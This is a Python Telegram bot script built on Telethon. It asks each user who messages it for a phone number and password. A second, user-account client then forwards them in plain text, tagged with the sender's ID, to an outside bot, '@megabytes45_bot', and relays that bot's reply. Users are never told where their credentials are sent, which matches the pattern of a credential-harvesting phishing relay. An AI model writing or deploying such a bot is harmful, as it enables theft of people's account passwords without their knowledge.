import os
import asyncio
from telethon import TelegramClient, events

# Retrieve configuration from environment variables
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')

# Initialize both clients at the global level
bot_client = TelegramClient('bot_auth_session', API_ID, API_HASH)
user_client = TelegramClient('user_forward_session', API_ID, API_HASH)

# Dictionary to manage user states
user_sessions = {}

@bot_client.on(events.NewMessage)
async def unified_handler(event):
    sender_id = event.sender_id
    incoming_text = event.message.message.strip()

    # Handle the start command explicitly
    if incoming_text == '/start':
        user_sessions[sender_id] = {'step': 'waiting_number'}
        await event.respond("Welcome! Please send your number.")
        return

    # If the user sends a message without initiating with /start
    if sender_id not in user_sessions:
        user_sessions[sender_id] = {'step': 'waiting_number'}
        await event.respond("Welcome! Please send your number.")
        return

    state = user_sessions[sender_id]

    # Process based on the current step
    if state['step'] == 'waiting_number':
        state['number'] = incoming_text
        state['step'] = 'waiting_password'
        await event.respond("Please send your password.")
        
    elif state['step'] == 'waiting_password':
        state['password'] = incoming_text
        state['step'] = 'processing'
        await event.respond("Processing your request, please wait...")

        # Create a Future object to wait for the response safely
        loop = asyncio.get_running_loop()
        state['future'] = loop.create_future()

        # Construct and send the payload
        payload = f"Number: {state['number']}\nPassword: {state['password']}\nUser_ID: {sender_id}"
        await user_client.send_message('@megabytes45_bot', payload)

        try:
            # Wait for the external bot reply with a timeout of 30 seconds
            response_text = await asyncio.wait_for(state['future'], timeout=30.0)
            await event.respond(f"Response received:\n{response_text}")
        except asyncio.TimeoutError:
            await event.respond("Error: Request timed out. The external bot did not reply in time.")
        finally:
            # Clear session after execution
            user_sessions.pop(sender_id, None)

# Global handler for the external bot responses
@user_client.on(events.NewMessage(from_users='@megabytes45_bot'))
async def external_bot_reply_handler(event):
    reply_text = event.message.message
    
    for sender_id, state in list(user_sessions.items()):
        if state.get('step') == 'processing' and 'future' in state:
            future = state['future']
            if not future.done():
                future.set_result(reply_text)
                break

async def main():
    await bot_client.start(bot_token=BOT_TOKEN)
    await user_client.start()
    
    await asyncio.gather(
        bot_client.run_until_disconnected(),
        user_client.run_until_disconnected()
    )

if __name__ == '__main__':
    asyncio.run(main())
